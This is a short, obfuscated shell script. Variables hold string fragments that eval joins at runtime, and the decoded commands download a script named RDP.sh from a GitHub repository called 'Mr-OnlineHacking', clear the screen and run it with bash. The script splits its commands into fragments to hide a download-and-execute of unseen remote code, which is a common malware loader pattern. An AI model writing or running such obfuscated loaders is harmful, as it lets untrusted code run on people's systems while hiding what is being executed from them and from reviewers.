z="
";Pz='t.co';cz='/SUM';Gz='rogr';Cz='wget';gz='ktop';Bz=' ""';Wz='neHa';hz='/RDP';jz='clea';Dz=' -q ';Uz='/Mr-';fz='_Des';Zz='in/O';iz='.sh';Kz='raw.';Mz='ubus';Sz='-Hac';Lz='gith';Xz='ckin';mz=' RDP';Oz='nten';Vz='Onli';kz='r';Fz='ow-p';dz='AN/C';bz='eHac';Qz='m/On';Tz='king';Rz='line';Yz='g/ma';Ez='--sh';az='nlin';ez='loud';Jz='s://';Hz='ess ';lz='bash';Iz='http';Nz='erco';Az='echo';
eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$Tz$cz$dz$ez$fz$gz$hz$iz$z$jz$kz$z$lz$mz$iz"
